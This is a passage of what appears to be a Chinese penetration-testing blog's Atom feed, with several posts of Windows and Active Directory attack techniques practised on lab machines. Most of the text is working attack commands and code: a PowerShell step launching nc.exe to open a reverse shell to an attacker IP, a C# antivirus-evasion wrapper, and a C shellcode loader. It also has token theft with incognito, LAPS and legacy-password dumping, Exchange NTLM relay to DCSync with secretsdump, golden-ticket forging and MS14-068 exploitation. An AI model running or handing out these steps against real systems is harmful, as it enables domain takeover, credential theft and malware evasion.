  </entry>
  
  <entry>
    <title>内网使用smb无文件执行</title>
    <link href="https://github.com/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/"/>
    <id>https://github.com/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/</id>
    <published>2020-04-26T05:04:38.000Z</published>
    <updated>2020-04-26T05:07:25.097Z</updated>
    
    <content type="html"><![CDATA[<p>创建smb共享</p><pre><code>mkdir smb &amp;&amp; cd smbcp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456</code></pre><p>测试：</p><pre><code>$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share</code></pre><p><img src="1.png" alt=""></p><p>执行：</p><pre><code>Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;创建smb共享&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir smb &amp;amp;&amp;amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2s
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>shell中实现runas命令</title>
    <link href="https://github.com/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/"/>
    <id>https://github.com/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/</id>
    <published>2020-04-26T04:51:45.000Z</published>
    <updated>2020-04-26T04:52:03.244Z</updated>
    
    <content type="html"><![CDATA[<p>有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果</p><pre><code>$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     $cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $credInvoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$pass = conv
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>C#底层调用powershell过杀软</title>
    <link href="https://github.com/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
    <id>https://github.com/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
    <published>2020-04-26T04:30:27.000Z</published>
    <updated>2020-04-26T04:32:21.948Z</updated>
    
    <content type="html"><![CDATA[<p><strong>这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。</strong></p><p>国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用</p><p>从C#中调用</p><p>添加运行powershell需要的程序包：</p><p>C#调用powershell安装system.management.automation.dll：</p><p>管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可</p><pre><code>using System; using System.Configuration.Install; using System.Runtime.InteropServices; using System.Management.Automation.Runspaces; public class Program { public static void Main() { } } [System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary savedState) { Mycode.Exec(); } } public class Mycode { public static void Exec() { string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;); RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create(); Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg); rspace.Open(); Pipeline pipeline = rspace.CreatePipeline(); pipeline.Commands.AddScript(command); pipeline.Invoke(); } }</code></pre><p>PS1文件需要适当混淆以过静态查杀</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;国内某数字杀软，会拦截powershell的运行，以前常用的复制powershel
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>C内存加载过杀软</title>
    <link href="https://github.com/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
    <id>https://github.com/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
    <published>2020-04-26T03:45:03.000Z</published>
    <updated>2020-04-26T03:49:11.228Z</updated>
    
    <content type="html"><![CDATA[<p>C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；</p><p>如最常用的加载器：</p><pre><code>#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)unsigned char shellcode[] =&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&quot;&quot;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&quot;&quot;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01&quot;&quot;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;&quot;\x45\x81\x3e\x43\x72\x65\x61\x75&quot;&quot;\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&quot;&quot;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&quot;&quot;\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53&quot;&quot;\x53\x53\x53\x53\x52\x53\xff\xd7&quot;;void main(){    ((void(*)(void))&amp;shellcode)();}</code></pre><p>解决方法1：加密shellcode再解密运行（最后用一些比较偏的加密算法）</p><p>解决方法2：pyaload分离<br>[1]借助main的入口参数，用户直接输shellcode</p><p>[2]从txt文件中加载shellcode</p><p>这个当初比较头疼，因为C语言这方面确实不大行，从txt读取shellcode的时候出现问题;记录如下：</p><ul><li>获取txt中shellcode长度，申请内存空间</li></ul><ul><li>.使用fread读取txt为字符串，加载难以识别出shellcode    </li></ul><ul><li>.fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；&lt;/p&gt;
&lt;p&gt;如最常用的加载器：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#pra
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>incognito Stealing Windows Access Tokens</title>
    <link href="https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"/>
    <id>https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/</id>
    <published>2020-04-26T02:18:58.000Z</published>
    <updated>2020-04-26T02:48:39.678Z</updated>
    
    <content type="html"><![CDATA[<p>使用incognito可以窃取令牌以任意用户身份执行任意命令或payload</p><p>得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌<br>列出域管理组成员：</p><pre><code>net groups &quot;Domain Admins&quot; /domain</code></pre><p><strong>0x01、ACCESS TOKEN(访问令牌)：</strong></p><p>当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权</p><p>Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌</p><p><strong>0x02、令牌类型</strong></p><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p><p>这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。</p><p><strong>0x03、本地和远程的基本用法</strong></p><p><strong>本地：</strong> </p><p>查看 token：</p><p><code>incognito.exe list_tokens–u</code> </p><p>获取到已注销用户 int18\administrator的token,盗取token 执行命令： </p><pre><code>incognito.exe execute -c &quot;int18\administrator&quot; calc.exe </code></pre><p><strong>远程：</strong></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u</code></pre><p><img src="1.png" alt=""></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe </code></pre><p><img src="2.png" alt=""></p><p><strong>0x04、提权、降权、伪造（以本地示例)</strong></p><pre><code>incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 </code></pre><p>0x03、获取TrustedInstaller 权限（修改系统文件）<br>管理员、System 均无法修改系统文件、需 TrustedInstaller 权限<br><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限</a></p><p>在CS下获取TrustedInstaller </p><blockquote><p>shell sc strat TrustedInstaller </p></blockquote><blockquote><p>steal token  1700 ##ps查看TrustedInstaller进程号</p></blockquote><blockquote><p>shell whoami /groups</p></blockquote><p>链接：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p><p><a href="https://blog.csdn.net/qq_36374896/article/details/84261516" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84261516</a>  </p><p><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html</a> </p><p><a href="https://www.jianshu.com/p/907c6aab6fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/907c6aab6fd0</a></p><p><a href="http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf" target="_blank" rel="noopener">http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;使用incognito可以窃取令牌以任意用户身份执行任意命令或payload&lt;/p&gt;
&lt;p&gt;得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌&lt;br&gt;列出域管理组成员：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net groups &amp;quot
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域渗透之AD Recyle Bin组利用+Ldaps信息枚举</title>
    <link href="https://github.com/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"/>
    <id>https://github.com/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</id>
    <published>2020-04-26T01:14:42.000Z</published>
    <updated>2020-04-26T01:37:49.040Z</updated>
    
    <content type="html"><![CDATA[<h2 id="AD-Recyle-Bin组利用："><a href="#AD-Recyle-Bin组利用：" class="headerlink" title="AD Recyle Bin组利用："></a>AD Recyle Bin组利用：</h2><p>使用回收站还原用户，或获取用户旧密码进行碰撞</p><p>前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中</p><p><strong>未启用启用回收站和启用回收站删除对象对比</strong></p><p>图1：启用回收站之前已删除的Active Directory对象的生命周期</p><p><img src="1.jpg" alt=""></p><p>图2：启用回收站后已删除的Active Directory对象的生命周期</p><p><img src="2.jpg" alt=""></p><p>启用AD回收站：</p><pre><code>Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’</code></pre><p>查看删除用户</p><pre><code>Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects</code></pre><p>结果示例：</p><pre><code>Deleted           : TrueDistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=localName              : TempAdmin                DEL:f0cc344d-31e0-4866-bceb-a842791ca059ObjectClass       : userObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059</code></pre><p>尝试还原已删除账户</p><pre><code>Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原</code></pre><p>或</p><pre><code>Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject</code></pre><p>查询ms-mcs-admpwd</p><pre><code>Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  </code></pre><p>查看有关于特定账户的全部属性信息：</p><pre><code>Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</code></pre><p>如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来</p><h2 id="Ldap枚举：获取基本的账户信息、密码"><a href="#Ldap枚举：获取基本的账户信息、密码" class="headerlink" title="Ldap枚举：获取基本的账户信息、密码"></a>Ldap枚举：获取基本的账户信息、密码</h2><p>ldapsearch 使用：<br>列出基本的上下文信息</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts</code></pre><p>提取整个域目录的数据，然后grep筛选输出：</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.outroot@kali:$ cat ldap.out |grep -i memberof</code></pre><p>筛选输出：</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType</code></pre><p>列出管理用户组</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberof</code></pre><p>Dump LAPS passwords:</p><pre><code>kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd</code></pre><p>同样windapsearch也是一个不错的工具</p><pre><code>kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users...user:r.thompsoncascadeLegacyPwd: clk0bjVldmE=...</code></pre><p><a href="https://github.com/snovvcrash/cheatsheets/tree/master">https://github.com/snovvcrash/cheatsheets/tree/master</a> </p><p><a href="https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html" target="_blank" rel="noopener">https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;AD-Recyle-Bin组利用：&quot;&gt;&lt;a href=&quot;#AD-Recyle-Bin组利用：&quot; class=&quot;headerlink&quot; title=&quot;AD Recyle Bin组利用：&quot;&gt;&lt;/a&gt;AD Recyle Bin组利用：&lt;/h2&gt;&lt;p&gt;使用回收站还原用户，
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之Exchange提权</title>
    <link href="https://github.com/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"/>
    <id>https://github.com/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/</id>
    <published>2020-04-25T16:09:28.000Z</published>
    <updated>2020-04-25T16:32:53.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理-："><a href="#原理-：" class="headerlink" title="原理 ："></a>原理 ：</h2><p>Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync</p><p>也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限</p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>net group 查看用户组</p><p><img src="1.png" alt=""></p><p>或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组</p><p>添加用户tw：</p><pre><code>$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -ForceNew-ADUser tw -AccountPassword $pass -Enabled $True</code></pre><p>将用户添加到Exchange Permissions组</p><pre><code>net group &quot;Exchange Windows Permissions&quot; tw /add 或Import-Module ActiveDirectoryAdd-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw</code></pre><p>检查是否已成功添加</p><pre><code>net group &quot;Exchange Windows Permissions&quot; /domain </code></pre><p>使用ntlmrelayx.py进行ntlm中继：</p><pre><code>sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw</code></pre><p>运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接</p><pre><code>python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local</code></pre><p>（10.10.16.21为我kali ip）</p><p><img src="2.png" alt=""></p><p>连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示</p><pre><code>impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc</code></pre><p><img src="3.png" alt=""></p><p><strong>进一步学习：在Linux上使用KRBTGT hash实现金票攻击</strong></p><p>在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它</p><p>首先获取domain sid ：</p><pre><code>Get-ADDomain htb.localS-1-5-21-3072663084-364016917-1341370565</code></pre><p>使用NTLM生成TGT###TGT也可以使用AES-KEY生成</p><pre><code>python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit</code></pre><p>运行之后生成一个UserDoesnotExit.ccache缓存文件<br>使用ccache设置ticket</p><p><code>export KRB5CCNAME=UserDoesnotExit.ccache</code></p><p>使用TGT使用下列任意方式远程执行命令</p><pre><code>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-passpython smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-passpython wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</code></pre><p>执行之前需要同步域控时间，否则会出现下列错误<br>    sudo rdate 10.10.10.161</p><p><img src="4.png" alt=""></p><pre><code>python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass</code></pre><p>不能使用IP进行连接</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理-：&quot;&gt;&lt;a href=&quot;#原理-：&quot; class=&quot;headerlink&quot; title=&quot;原理 ：&quot;&gt;&lt;/a&gt;原理 ：&lt;/h2&gt;&lt;p&gt;Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteD
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之ms14-068</title>
    <link href="https://github.com/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/"/>
    <id>https://github.com/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/</id>
    <published>2020-04-25T14:57:08.000Z</published>
    <updated>2020-04-25T15:10:07.667Z</updated>
    
    <content type="html"><![CDATA[<p>危害：任意域控用户都可以提权到域控<br>一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制</p><h2 id="一、漏洞成因"><a href="#一、漏洞成因" class="headerlink" title="一、漏洞成因"></a>一、漏洞成因</h2><p>在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，<strong>却允许任意签名算法</strong>。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 </p><p><strong>什么是PAC（特权帐户证书）：</strong></p><p>PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。<br>    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。</p><h2 id="二、利用条件"><a href="#二、利用条件" class="headerlink" title="二、利用条件"></a>二、利用条件</h2><pre><code>1.域控机器没有打漏洞补丁      补丁号：KB30117802.拥有一台域内机子及其sid</code></pre><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>漏洞检测：<br>FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)</p><pre><code>./FindSMB2UPTime.py 192.168.31.220DC is up since: 2013-12-28 22:24:25This DC is vulnerable to MS14-068</code></pre><p>获取域控制器补丁状态:Get-DCPatchStatus.ps1</p><pre><code># This is an example script only.import-module activedirectory[string]$KBNumber = &quot;KB3011780&quot;$DomainControllers = Get-ADDomainController -filter *[int]$DomainControllersCount = $DomainControllers.Count[int]$PatchedDCCount = 0[int]$UnPatchedDCCount = 0$UnpatchedDCs = @()Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;ForEach ($DomainController in $DomainControllers){    $DomainControllerHostName = $DomainController.HostName    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue    IF ($PatchStatus.InstalledOn)        {            $PatchStatusInstalledOn = $PatchStatus.InstalledOn            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;            $PatchedDCCount++        }    Else        {            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;            [array]$UnpatchedDCs += $DomainController.HostName            $UnPatchedDCCount++        }}Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;IF ($UnpatchedDCs){    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;    $UnpatchedDCs}</code></pre><p>环境描述：</p><p>目标机器：10.10.10.52  Windows Server 2008 R2 Standard</p><p>已获取：DC上的一个普通本地账户</p><ul><li>james用户账户密码</li></ul><ul><li>james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）</li></ul><p>攻击机：kali 10.10.14.14  （不在域中）</p><h2 id="在Linux上：-没有目标shell的情况下"><a href="#在Linux上：-没有目标shell的情况下" class="headerlink" title="在Linux上：(没有目标shell的情况下)"></a>在Linux上：(没有目标shell的情况下)</h2><p>1.安装客户端，在客户端生成票证</p><pre><code>sudo apt-get install krb5-user cifs-utils rdate</code></pre><p>2./etc/hosts中添加：（内网机器没有映射，所以需要添加）</p><pre><code>10.10.10.52 htb.local htb mantis.htb.local  mantis</code></pre><p>3.编辑/etc/krb5.conf</p><pre><code>[libdefaults]    default_realm = HTB.LOCAL[realms]   HTB.LOCAL = {    kdc = mantis.htb.local:88    admin_server = mantis.htb.local    default_domain = HTB.LOCAL    }[domain_realm]    .domain.internal = HTB.LOCAL    domain.internal = HTB.LOCAL</code></pre><p>4.添加路由：编辑/etc/resolve.conf</p><pre><code>nameserver 10.10.10.52</code></pre><p>5.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）</p><ul><li><p>[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间</p></li><li><p>[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间</p></li></ul><p>6.为james用户生成一张新的Kerberos票证</p><pre><code>kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit jamesklist</code></pre><p><img src="1.png" alt=""></p><p>此时生成的是jame是的票证：访问C$是没有权限的</p><pre><code>kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -ktree connect failed: NT_STATUS_ACCESS_DENIED</code></pre><p>7.ms14-068生成高权限TGT票证</p><p><img src="2.png" alt=""></p><p>8.替换低权限票证</p><pre><code>mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_1000</code></pre><p>9.smb成功登录C$</p><p><img src="3.png" alt=""></p><h2 id="Mimikatz："><a href="#Mimikatz：" class="headerlink" title="Mimikatz："></a>Mimikatz：</h2><p>先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令</p><pre><code>ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis</code></pre><p>将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中</p><pre><code>mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit</code></pre><p>注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket</p><pre><code>net use \\htb.local\admin$    ####使用IP可能会失败dir \\htb.local\c$ psexec  \\htb.local  cmd.exe</code></pre><p><strong>突破“本地账户才能漏洞利用”的限制</strong>：<br>先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接<br>原理：<a href="https://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/56081.html</a></p><p>GoldenPac,py<br>也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）</p><p><img src="4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;危害：任意域控用户都可以提权到域控&lt;br&gt;一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制&lt;/p&gt;
&lt;h2 id=&quot;一、漏洞成因&quot;&gt;&lt;a href=&quot;#一、漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞成因&quot;&gt;&lt;/a&gt;一
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Kerberos认证学习</title>
